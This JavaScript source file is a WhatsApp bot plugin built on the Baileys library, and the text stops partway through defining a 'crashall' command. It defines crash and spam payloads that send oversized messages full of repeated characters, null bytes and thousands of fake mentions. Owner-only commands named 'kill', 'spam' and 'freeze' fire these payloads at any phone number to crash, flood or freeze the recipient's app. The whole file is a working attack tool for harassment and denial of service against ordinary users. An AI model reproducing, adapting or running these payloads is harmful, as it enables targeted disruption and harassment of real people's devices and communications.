const { cmd } = require('../momy');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// ============================================================
// CRASH / SPAM FUNCTIONS (Conservées telles quelles)
// ============================================================

async function cv03(prim, target) {
  let tempek = "ꦾ".repeat(20000);
  let lah = "ꦾ".repeat(1000);
  let assertBlank = (
    await prim.getUSyncDevices([target], true, true)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
  let MSG = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "Primis" + "ꦾ".repeat(40000)
          },
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
              mimetype: "image/jpeg",
              fileSha256: Buffer.from("Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=", "base64"),
              fileLength: 99999999,
              height: 99999,
              width: 99999,
              mediaKey: Buffer.from("n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", "base64"),
              fileEncSha256: Buffer.from("LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=", "base64"),
              directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
              mediaKeyTimestamp: Date.now(),
              jpegThumbnail: null,
              scansSidecar: Buffer.from("mh5/YmcAWyLt5H2qzY3NtHrEtyM=", "base64"),
              scanLengths: [2437, 17332]
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "\ub000".repeat(10000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: "\u0000".repeat(10000),
                  sections: [{ title: "", rows: [] }]
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(20000),
                  id: null
                })
              },
              {
                name: "carousel_message",
                buttonParamsJson: JSON.stringify({
                  carousel: {
                    cards: Array.from({ length: 10 }, () => ({
                      title: "ꦽ".repeat(2000),
                      description: "ꦽ".repeat(1500),
                      id: `p_${Math.random().toString(36).slice(2)}_${Buffer.alloc(10).toString("hex")}`
                    }))
                  }
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: tempek,
                  copy_code: tempek
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: tempek,
                  url: "https://t.me/dsprimis"
                })
              },
              {
                name: "request_location",
                buttonParamsJson: JSON.stringify({
                  type: "request_location",
                  display_text: tempek,
                  params: {}
                })
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: tempek,
                  phone_number: "+132489778999"
                })
              },
              {
                name: "request_phone",
                buttonParamsJson: JSON.stringify({
                  type: "request_phone_numbe",
                  display_text: tempek
                })
              },
              {
                name: "poll_creation",
                buttonParamsJson: JSON.stringify({
                  poll: {
                    name: tempek,
                    options: [lah, lah, lah]
                  }
                })
              }
            ]
          },
          contextInfo: {
            stanzaId: "fusion-" + Date.now(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              conversation: "ꦾ".repeat(5000)
            }
          }
        }
      }
    }
  };
  await prim.assertSessions(assertBlank);
  let gen = generateWAMessageFromContent(target, MSG, {
    userJid: prim.user.id
  });
  await prim.relayMessage(target, gen.message, {
    messageId: gen.key.id
  });
}

async function xnull(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/645776126_1280025890693884_6050303356821611654_n.enc?ccb=11-4&oh=01_Q5Aa3wF-fBlF7AOslbrH7jjPcFnX_BzrflXXPGsmxnM0uhxYYw&oe=69CE128E&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "jXzsXDlpo31sByJE5OYA9ZUMnuUae0BXtrNGy4hCVig=",
          fileLength: "259013",
          seconds: 15,
          mediaKey: "e5LJ5ZwNqcga0by/NdlRMmetOwXcyGfHCVhr8ceilhU=",
          height: 768,
          width: 720,
          fileEncSha256: "XC3UqvV1V4CeiIlJhTO5du/pOntBD+1OOA8iq/Y5p8w=",
          directPath: "/v/t62.7161-24/645776126_1280025890693884_6050303356821611654_n.enc?ccb=11-4&oh=01_Q5Aa3wF-fBlF7AOslbrH7jjPcFnX_BzrflXXPGsmxnM0uhxYYw&oe=69CE128E&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1772530165",
          streamingSidecar: "5YX1BKezSdTHMY1N6tEP2b/ecHZjNthPipboftlIdyOfakOzTFIzuw==",
          thumbnailDirectPath: "/v/t62.36147-24/25228186_1232083142443331_1964661740203977559_n.enc?ccb=11-4&oh=01_Q5Aa3wERRbWyLSeefyR_Rh31Wem6dbUaiFzpl3N6jVDqrMB_oA&oe=69CE1EF9&_nc_sid=5e03e0",
          thumbnailSha256: "UtyCHWqzjC40ZRk5IJUdMVFTiy/oQuEwtUuHZW3hr4o=",
          thumbnailEncSha256: "Gax4Ay5wUF7p3iAL+VRtRNaZHhgrRghsk8j1odhMQEQ=",          
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            pairedMediaType: "NOT_PAIRED_MEDIA",
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
            ],
            businessMessageForwardInfo: {
              businessOwnerJid: "13135550002@s.whatsapp.net"
            }
          },          
          annotations: [
            {
              polygonVertices: [
                { x: 0.13136081397533417, y: 0.2330484688282013 },
                { x: 0.8915920257568359, y: 0.33050620555877686 },
                { x: 0.8422446250915527, y: 0.6693967580795288 },
                { x: 0.08201342821121216, y: 0.5719390511512756 }
              ],
              shouldSkipConfirmation: true,
              embeddedContent: {
                embeddedMessage: {
                  stanzaId: "AC6B8720C5E48ED2FE0344CB4D9FE72C",
                  message: {
                    extendedTextMessage: {
                      text: "ោ៝".repeat(40000),
                      inviteLinkGroupTypeV2: "DEFAULT",
                      previewType: 6,
                      paymentLinkMetadata: {
                        button: { displayText: "Where's my mind?" },
                        header: { headerType: 1 },
                        provider: { paramsJson: "{".repeat(20000) }
                      }
                    },
                    messageContextInfo: {
                      messageSecret: "40/QKzk540cusjm7kQVSP+iFvwxcVWmvZQVXLRsG9tQ=",
                      messageAssociation: {
                        associationType: 16,
                        parentMessageKey: {
                          remoteJid: "status@broadcast",
                          fromMe: false,
                          id: "292939377KSSJHSGSGS",
                          participant: target
                        }
                      }
                    }
                  }
                }
              },
              embeddedAction: true
            },
            {
              polygonVertices: [
                { x: 0.15211491286754608, y: 0.08034374564886093 },
                { x: 0.8228726387023926, y: 0.08034374564886093 },
                { x: 0.8228726387023926, y: 0.9027109146118164 },
                { x: 0.15211491286754608, y: 0.9027109146118164 }
              ],
              shouldSkipConfirmation: true,
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "1379256670882313",
                  songId: "1374871380564221",
                  author: "ោ៝".repeat(40000),
                  title: "ោ៝".repeat(40000),
                  artworkDirectPath: "/v/t62.76458-24/593492274_1483167179816398_7127271849112504686_n.enc?ccb=11-4&oh=01_Q5Aa3wFdvmFjS_JyO3tLmsFZPHAnBtTwgFp-yGBNSXS3mQ6h4Q&oe=69CE051F&_nc_sid=5e03e0",
                  artworkSha256: "z8mLVTeeqq7eVwidkPfNxPzCBCB3mwHVhC9q9JO2JvA=",
                  artworkEncSha256: "V8u/rP2Xbf7I03WWJ3B9GNh9/IATi3ZwBDRluvLj818=",
                  artistAttribution: "",
                  countryBlocklist: "WEs=",
                  isExplicit: false,
                  artworkMediaKey: "xCZHYFPApBEk+2omh0kt3koDL/skDTZCh6nYukS+e14="
                }
              },
              embeddedAction: true
            },
            {
              polygonVertices: [
                { x: 0.08561918884515762, y: 0.43682441115379333 },
                { x: 0.9037145972251892, y: 0.4592041075229645 },
                { x: 0.9004841446876526, y: 0.5631676912307739 },
                { x: 0.08238872140645981, y: 0.5407880544662476 }
              ],
              location: {
                degreesLatitude: -101010,
                degreesLongitude: 101010,
                name: "ោ៝".repeat(40000)
              }
            }
          ]
        }
      }
    }
  }, {});

  return await prim.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function PeriaSoloNoConter(target) {
  const msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Primis"
            },
            nativeFlowResponseMessage: {
              name: "secred_invesions_message",
              paramsJson: "\u0000".repeat(500000),
              version: 3
            },
            contextInfo: {
              businessMessageForwardInfo: {
              businessOwnerJid: "13915134097101@s.whatsapp.net"
            },
              stanzaId: "PeriaSolo" + "NoConter" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
              newsletterJid: "13915134097101@newsletter",
              serverMessageId: 1,
              newsletterName: "ោ៝".repeat(10000)
            },
            mentionedJid: [
             "0@s.whatsapp.net",
             ...Array.from({ length: 2000 }, () =>
             `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});
  
  await prim.relayMessage(target, msg.message, {
     messageId: msg.key.id,
     participant: { jid: target },
  });
}

async function BlackScreen(target) {
  await prim.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "Squichy PROJECT",
                address: "BY @dsprimis",
                jpegThumbnail: null
              },
              hasMediaAttachment: true
            },
            body: {},
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "ោ៝".repeat(40000)
                  })
                }
              ],
              messageParamsJson: "{}"
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              pairedMediaType: "NOT_PAIRED_MEDIA",
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast"
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

async function zXfreeze(isTarget) {
  var Videox = {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/573638734_1469804761202279_6437505177805631634_n.enc?ccb=11-4&oh=01_Q5Aa4AGIZi2WHFTyLffJtq_GjfVk-SnkgWZog4aoDWx7n-PUYA&oe=69E1A94A&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "VF5ZuntXYI59R/4LrPCoETOTfNj+mrEV9nayC+hq0LM=",
    "fileLength": "2684743",
    "seconds": 153,
    "mediaKey": "vPrEbFav/Lh1CD9PFNx4lx3F2OP3LugeieFhHr/+7oc=",
    "caption": "ꦾ".repeat(50000),
    "height": 240,
    "width": 320,
    "fileEncSha256": "Rv+qeol4QvrDUG2sav0bFrA0cyjsUXFkwt7xfYkYrSM=",
    "directPath": "/v/t62.7161-24/573638734_1469804761202279_6437505177805631634_n.enc?ccb=11-4&oh=01_Q5Aa4AGIZi2WHFTyLffJtq_GjfVk-SnkgWZog4aoDWx7n-PUYA&oe=69E1A94A&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1773743755",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADYASAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAAAwECBAUGAQEBAQEBAAAAAAAAAAAAAAAAAQIEA//aAAwDAQACEAMQAAAA88tiyHJasU1M5VzEssABbLVGq1Hn09HJ28e2enfxnPUBCl6Gn3I6c9WZ042hc6XnvQ+evjYBkWBNgF2AIAYAf//EACcQAAICAAUDBAMBAAAAAAAAAAECAAMEEBESMDEiMhMiM0FRUmFy/9oACAEBAAE/AIecgilQd48QgAdDmMzlXW9jaKJ+Cnok7vdHras6MMhmZXU9rAKIUXDV7l7jyZUC1LibVtUq3Mtpeo9YM6axY+hIEpC01blAMZbGO4iVblQkaHX9Qq286dIK2es6qCPqXIEfQZjulfI8TEfCkF/p31/Q5mI+YkTDn22eI3efOY7h5i16Feo4mLIqw6kwkkkzDH1ehPuEpCqLNWHEbvPnM8zew/oxrbHADOSBkrMp1B0hZv8ARgy//8QAIREAAgIBAgcAAAAAAAAAAAAAAREAAgMxAyAwMjNBUnH/2gAIAQIBAT8A0gMqF3uKjtfWPmbgB1KhQvara45dnCvaJ3pbyEJffy/df//EACARAAEEAgIDAQAAAAAAAAAAAAEAAhIxAxEgYQQQQUP/2gAIAQMBAT8AQutpw61wwta3b32BSaA7AZXa0Yy9C1MDyXn5ELG8Sf2CvzZz/9k=",
    "contextInfo": {
      "pairedMediaType": "NOT_PAIRED_MEDIA"
    },
    "streamingSidecar": "Ol1HksMqmL3uzhw8hbdhY7g4oqwc6Gwb+73vScnrAzEymWrhdAp00cYluHhva1PqufcTKbeEP/6Po9ITl8E3pW5CmjXClKCENPVWGWBhTrqTJSMMBa8bCuxjper3uCUo0AdukOJImQ5UOlWmiCi1d0oiCeCku/AScyjm+osCFZu6ZR8/rgg6cmaj+D3rAU+V7r4siSmJL4tQBA0lpg9mdlEeFff7Csk4xqpTivSqGKOHzVmb2s0YjlDZZWLbISnm0u+DykCb4wXpEBJ4FCvaIeJ9QOEHVa+NQOrUSiJ2Ae7i9vsYbET8yCdjft4dTkhkgytGH/6hP9phEWMsW1IgriHgGh0csF62pfCZjpLfM0cENPa6dvuT865mKTbgMj+BlIWWP5b2Da9Mg8X3PfTsFAgTje41GcTKdfgcckFjoymdBNhQHpv9D6QZgZjCsYTW0qs+e2DsimjNtDrvxUUPa3TdR16pT3GWLfiH2YHuzR1d1/BV4kueh7d+MnGKS9ZAHToEjCzObs7xnIMO3IuzGuwnyh67AYRV1U4="
  };

  await prim.relayMessage(isTarget, { "videoMessage": Videox }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: 0,
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  });
}

async function SecredDelayNTF(target) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "DsPrimis",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(50000),
            version: 3
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            participant: target,
            isForwarded: true,
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 2991 }, () => 1 + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            entryPointConversionSource: "galaxy_message"
          }
        }
      }
    }
  }, {});
  
  await prim.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await new Promise((r) => setTimeout(r, 1000));
}

async function DocNull(target) {
  await prim.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "ោ៝".repeat(20000),
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  }, { participant: { jid: target }, });
}

async function xNekoGalaxy(prim, target) {
    const Neko = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "LOVEIPAR", hasMediaAttachment: false },
                    body: { text: "Primis" + "ꦽ".repeat(40000) },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "galaxy_message",
                            buttonParamsJson: JSON.stringify({
                                flow_action: "navigate",
                                flow_id: "666",
                                flow_token: "PLER_" + Math.random(),
                                flow_message_version: "9.9.9",
                                flow_cta: "DON'T CLICK".repeat(1000)
                            })
                        }],
                        messageParamsJson: "{\"id\":\"" + Date.now() + "\"}"
                    }
                }
            }
        }
    };
    await prim.relayMessage(target, Neko, { participant: { jid: target } });
}

async function xNekoPoll(prim, target) {
    const Maklu = Buffer.alloc(10).toString('hex');
    await prim.relayMessage(target, {
        pollCreationMessage: {
            name: "⚠️ Primis" + Maklu + "ꦾ".repeat(15000),
            options: [
                { optionName: "@dsprimis" + "ោ៝".repeat(8000) },
                { optionName: "Squichy" + "ោ៝".repeat(8000) }
            ],
            selectableOptionsCount: 0
        }
    }, { participant: { jid: target } });
}

async function DelayNew(prim, target) {
  const Msg = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "Primis",
            format: "DEFAULT"
          }, 
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(900000),
            version: 3,
            contextInfo: {
              mentionedJid: Array.from({ length: 5000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
            }
          }
        }
      }
    }
  };
  await prim.relayMessage(target, Msg, {});
}

async function xorvnsor(prim, target) {
  const fvck = () => Math.random().toString(36).substring(2, 18) + Date.now().toString(36);
  const oneMBPayload = "\u0000".repeat(1024 * 1024);
  const longText = "ꦾ".repeat(50000);
  
  try {
    await prim.relayMessage(target, {
      extendedTextMessage: {
        text: oneMBPayload.substring(0, 10200) + "..." + fvck(),
        matchedText: `https://t.me/${fvck()}dsprimis`,
        canonicalUrl: `https://t.me/${fvck()}dsprimis`,
        description: longText + "\u0000".repeat(10000) + fvck(),
        title: oneMBPayload.substring(0, 1000),
        textArgb: parseInt('0x00000000', 16),
        backgroundArgb: parseInt('0xFFFF0000', 16),
        font: 2,
        previewType: 1,
        jpegThumbnail: Buffer.concat([
          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
          Buffer.alloc(50000, 1)
        ]),
        contextInfo: {
          stanzaId: fvck() + fvck(),
          isForwarded: true, 
          ForwardingScore: 999,
          participant: target,
          quotedMessage: {
            conversation: `p${fvck()}\u0000`.repeat(10000) + longText.substring(0, 10000)
          },
          mentionedJid: [
            ...Array.from(
              { length: 1900 },
              (_, p) => `86705131476${p}@bot`
            ),
            target,
            "0@s.whatsapp.net"
          ],
          remoteJid: "status@broadcast",
          externalAdReply: {
            title: "起 ⱠØVɆ ɎØɄ " + "\u0000".repeat(1000),
            body: "\u0000".repeat(1000) + longText.substring(0, 20000),
            previewType: "PHOTO",
            showAdAttribution: true,
            thumbnailUrl: "https://files.catbox.moe/06rcri.jpg",
            mediaType: 1,
            renderLargerThumbnail: true,
            sourceUrl: "https://t.me/dsprimis"
          }
        },
        doNotPlayInline: false,
        thumbnailDirectPath: "/v/t62.36145-24/560563266_1182091507314177_4487430912428629502_n.enc?ccb=11-4&oh=01_Q5Aa2gG3JeeF4eDKCSo_6O4YFwgV8JNjpM4xlpk7Dus5lLDCRg&oe=6909CF33&_nc_sid=5e03e0",
        thumbnailSha256: Buffer.concat([
          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
          Buffer.alloc(20000, 2)
        ]),
        thumbnailEncSha256: Buffer.concat([
          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
          Buffer.alloc(20000, 3)
        ]),
        mediaKey: Buffer.concat([
          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
          Buffer.alloc(30000, 4)
        ]),
        mediaKeyTimestamp: fvck() + Date.now().toString() + fvck(),
        thumbnailHeight: 1080,
        thumbnailWidth: 1920,
        inviteLinkGroupType: 1,
        inviteLinkGroupTypeV2: "default",
        inviteLinkParentGroupSubject: "\u1049".repeat(1000) + "\u0000".repeat(10000),
        inviteLinkParentGroupThumbnail: Buffer.concat([
          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
          Buffer.alloc(40000, 5)
        ]),
      }
    }, { 
      messageId: fvck() + fvck(), 
      participant: { jid: target } 
    });
    
    await prim.relayMessage(target, {
      extendedTextMessage: {
        text: oneMBPayload.substring(0, 15500) + "..." + fvck(),
        matchedText: `https://t.me/${fvck()} dsprimis`,
        canonicalUrl: `https://t.me/${fvck()}dsprimis`,
        description: longText + "\u0000".repeat(20000) + fvck(),
        title: oneMBPayload.substring(0, 1000),
        textArgb: parseInt('0x00000000', 16),
        backgroundArgb: parseInt('0xFFFF0000', 16),
        font: 2,
        previewType: 1,
        jpegThumbnail: Buffer.concat([
          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
          Buffer.alloc(50000, 1)
        ]),
        contextInfo: {
          stanzaId: fvck() + fvck(),
          isForwarded: true, 
          ForwardingScore: 999,
          participant: target,
          quotedMessage: {
            conversation: `p${fvck()}\u0000`.repeat(10000) + longText.substring(0, 10000)
          },
          mentionedJid: [
            ...Array.from(
              { length: 1900 },
              (_, p) => `86705131476${p}@bot`
            ),
            target,
            "0@s.whatsapp.net"
          ],
          remoteJid: "status@broadcast",
          externalAdReply: {
            title: "起 ⱠØVɆ ɎØɄ " + "\u0000".repeat(1000),
            body: "\u0000".repeat(1000) + longText.substring(0, 20000),
            previewType: "PHOTO",
            showAdAttribution: true,
            thumbnailUrl: "https://files.catbox.moe/06rcri.jpg",
            mediaType: 1,
            renderLargerThumbnail: true,
            sourceUrl: "https://t.me/dsprimis"
          }
        },
        doNotPlayInline: false,
        thumbnailDirectPath: "/v/t62.36145-24/560563266_1182091507314177_4487430912428629502_n.enc?ccb=11-4&oh=01_Q5Aa2gG3JeeF4eDKCSo_6O4YFwgV8JNjpM4xlpk7Dus5lLDCRg&oe=6909CF33&_nc_sid=5e03e0",
        thumbnailSha256: Buffer.concat([
          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
          Buffer.alloc(20000, 2)
        ]),
        thumbnailEncSha256: Buffer.concat([
          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
          Buffer.alloc(20000, 3)
        ]),
        mediaKey: Buffer.concat([
          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
          Buffer.alloc(30000, 4)
        ]),
        mediaKeyTimestamp: fvck() + Date.now().toString() + fvck(),
        thumbnailHeight: 1080,
        thumbnailWidth: 1920,
        inviteLinkGroupType: 1,
        inviteLinkGroupTypeV2: "default",
        inviteLinkParentGroupSubject: "\u1049".repeat(1000) + "\u0000".repeat(10000),
        inviteLinkParentGroupThumbnail: Buffer.concat([
          Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
          Buffer.alloc(40000, 5)
        ]),
      }
    }, { 
      messageId: fvck() + fvck(), 
      participant: { jid: target } 
    });
 
  } catch (e) { 
    console.log("❌ Error:", e.message);
  }
}

// ============================================================
// OWNER COMMANDS - POWERFUL CRASH/SPAM TOOLS
// ============================================================

// Command: .kill <number> - Ultimate crash combo
cmd({
    pattern: "kill",
    alias: ["destroy", "crash", "nuke"],
    desc: "Ultimate crash combo - sends multiple crash payloads",
    category: "bug",
    react: "💀",
    filename: __filename
},
async(conn, mek, m, { from, args, isOwner, reply, sender }) => {
    if (!isOwner) return reply("❌ Owner only command");
    
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else if (m.quoted) {
        target = m.quoted.sender;
    } else {
        return reply("❌ Please mention a user, provide a number, or reply to a message\n\nExample: .kill 255712345678");
    }
    
    reply(`🔥 Starting KILL sequence on ${target.split('@')[0]}...`);
    
    try {
        // Execute multiple crash functions
        await cv03(conn, target);
        await new Promise(r => setTimeout(r, 500));
        await xnull(target);
        await new Promise(r => setTimeout(r, 500));
        await PeriaSoloNoConter(target);
        await new Promise(r => setTimeout(r, 500));
        await BlackScreen(target);
        await new Promise(r => setTimeout(r, 500));
        await zXfreeze(target);
        await new Promise(r => setTimeout(r, 500));
        await SecredDelayNTF(target);
        await new Promise(r => setTimeout(r, 500));
        await DocNull(target);
        
        reply(`✅ KILL sequence completed on ${target.split('@')[0]} - Target has been crashed! 💀`);
    } catch (e) {
        reply(`❌ Error: ${e.message}`);
    }
});

// Command: .spam <number> - Heavy spam attack
cmd({
    pattern: "spam",
    alias: ["flood", "bomb"],
    desc: "Heavy spam attack on target",
    category: "bug",
    react: "💣",
    filename: __filename
},
async(conn, mek, m, { from, args, isOwner, reply, sender }) => {
    if (!isOwner) return reply("❌ Owner only command");
    
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else {
        return reply("❌ Please mention a user or provide a number\n\nExample: .spam 255712345678");
    }
    
    const count = parseInt(args[1]) || 5;
    if (count > 20) return reply("❌ Max spam count is 20");
    
    reply(`💣 Starting SPAM attack on ${target.split('@')[0]} (${count} cycles)...`);
    
    for (let i = 0; i < count; i++) {
        try {
            await xNekoGalaxy(conn, target);
            await new Promise(r => setTimeout(r, 300));
            await xNekoPoll(conn, target);
            await new Promise(r => setTimeout(r, 300));
            await xorvnsor(conn, target);
            await new Promise(r => setTimeout(r, 500));
        } catch (e) {}
    }
    
    reply(`✅ SPAM completed on ${target.split('@')[0]} - ${count} cycles sent! 💣`);
});

// Command: .freeze <number> - Freeze target's WhatsApp
cmd({
    pattern: "freeze",
    alias: ["lag", "slow"],
    desc: "Freeze target's WhatsApp with heavy payload",
    category: "bug",
    react: "❄️",
    filename: __filename
},
async(conn, mek, m, { from, args, isOwner, reply, sender }) => {
    if (!isOwner) return reply("❌ Owner only command");
    
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else {
        return reply("❌ Please mention a user or provide a number\n\nExample: .freeze 255712345678");
    }
    
    reply(`❄️ Freezing ${target.split('@')[0]}...`);
    
    try {
        await zXfreeze(target);
        await new Promise(r => setTimeout(r, 500));
        await BlackScreen(target);
        await new Promise(r => setTimeout(r, 500));
        await xnull(target);
        
        reply(`✅ ${target.split('@')[0]} has been FROZEN! ❄️`);
    } catch (e) {
        reply(`❌ Error: ${e.message}`);
    }
});

// Command: .crashall - Crash all mentioned/replied users
cmd({
    pattern: "crashall",
    alias: ["killall", "masscrash"],
    desc: "Crash multiple users at once",
    category: "bug",
